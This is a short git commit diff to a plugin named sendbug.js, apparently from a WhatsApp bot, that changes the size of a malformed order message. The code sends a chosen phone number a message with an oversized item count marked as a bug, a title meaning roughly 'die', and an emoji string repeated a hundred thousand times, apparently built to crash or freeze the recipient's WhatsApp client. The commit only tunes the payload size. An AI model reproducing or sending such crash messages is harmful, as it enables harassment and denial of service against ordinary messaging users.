486bddfc30afdce2c714b3e80d8c337362029de1
Ilman <87686497+ilmanhdyt@users.noreply.github.com>
2021-10-20 15:49:30 +0800

    Update sendbug.js

--- plugins/sendbug.js
+++ plugins/sendbug.js
@@ -11,7 +11,7 @@ conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'Ini Apaan?', 
     itemCount: 999999999999999999999999999999999999, // Bug
     status: 1,
     surface: 1,
-    message: '🔥'.repeat(1000000),
+    message: '🔥'.repeat(100000),
     orderTitle: 'MAMPUS', // Idk what this does
     sellerJid: '0@s.whatsapp.net' // Seller
    }
